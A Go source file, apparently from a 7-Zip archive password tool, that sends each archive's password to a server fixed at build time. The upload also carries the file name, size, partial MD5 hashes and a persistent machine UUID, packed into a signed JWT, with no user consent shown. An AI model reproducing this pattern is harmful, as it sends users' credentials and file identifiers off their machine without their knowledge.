package main

import (
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/golang-jwt/jwt/v5"
	"github.com/google/uuid"
)

var (
	// 构建时注入（见 build.bat 的 -ldflags -X），未注入时为 "default"
	appKey    = "default" // 默认值，会被构建时的值覆盖
	appSecret = "default" // 默认值，会被构建时的值覆盖
	serverURL = "default" // 默认值，会被构建时的值覆盖
)

// ClientConfig 客户端本地配置（仅存 UUID 用于上报标识）
type ClientConfig struct {
	UUID string `json:"uuid"`
}

// 参数：
// archivePath: 压缩文件路径
// password: 密码
// 返回：是否成功
func reportPassword(archivePath, password string) bool {
	sendPasswordToServer(serverURL, appKey, appSecret, archivePath, password)
	return true
}

func sendPasswordToServer(serverURL, appKey, appSecret, filePath, password string) error {

	// 打开文件
	file, err := os.Open(filePath)
	if err != nil {
		if debugMode {
			return fmt.Errorf("打开文件失败: %v", err)
		}
		return err
	}
	defer file.Close()

	// 获取文件信息
	fileInfo, err := file.Stat()
	if err != nil {
		if debugMode {
			return fmt.Errorf("获取文件信息失败: %v", err)
		}
		return err
	}

	// 获取文件类型
	fileType := getFileTypeDesc(getFileType(filePath))

	// 计算前1024字节的MD5
	hash := md5.New()
	buffer := make([]byte, 1024)
	n, err := file.Read(buffer)
	if err != nil && err != io.EOF {
		return err
	}
	hash.Write(buffer[:n])
	md51024 := hex.EncodeToString(hash.Sum(nil))

	// 重置文件指针
	file.Seek(0, 0)

	// 计算前1MB的MD5
	hash = md5.New()
	buffer = make([]byte, 1024*1024)
	n, err = file.Read(buffer)
	if err != nil && err != io.EOF {
		return err
	}
	hash.Write(buffer[:n])
	md51mb := hex.EncodeToString(hash.Sum(nil))

	uuid := loadOrGenerateUUID()
	// 准备请求参数
	params := map[string]interface{}{
		"name_raw":  filepath.Base(filePath),
		"size":      fileInfo.Size(),
		"md5_1024":  md51024,
		"md5_1mb":   md51mb,
		"password":  password,
		"uuid":      uuid,
		"file_type": fileType,
	}
	// 生成 JWT
	token, err := generateJWT(appKey, appSecret, params)
	if err != nil {
		return err
	}
	// 创建请求
	req, err := http.NewRequest("POST", serverURL, nil)
	if err != nil {
		return err
	}
	// 设置请求头
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// 生成JWT令牌
func generateJWT(appKey, appSecret string, params map[string]interface{}) (string, error) {
	token := jwt.New(jwt.SigningMethodHS256)
	claims := token.Claims.(jwt.MapClaims)
	claims["app_key"] = appKey
	claims["params"] = params
	claims["exp"] = time.Now().Add(time.Minute * 5).Unix()

	return token.SignedString([]byte(appSecret))
}

func loadOrGenerateUUID() string {
	// 配置文件路径
	//配置文件放在临时目录里
	configPath := filepath.Join(os.TempDir(), "7zrpw", "client.json")

	// 尝试加载现有配置
	var config ClientConfig
	data, err := os.ReadFile(configPath)
	if err == nil {
		json.Unmarshal(data, &config)
		if config.UUID != "" {
			return config.UUID
		}
	}

	// 生成新的 UUID
	config.UUID = uuid.New().String()

	// 保存配置
	if data, err := json.Marshal(config); err == nil {
		os.WriteFile(configPath, data, 0644)
	}

	return config.UUID
}
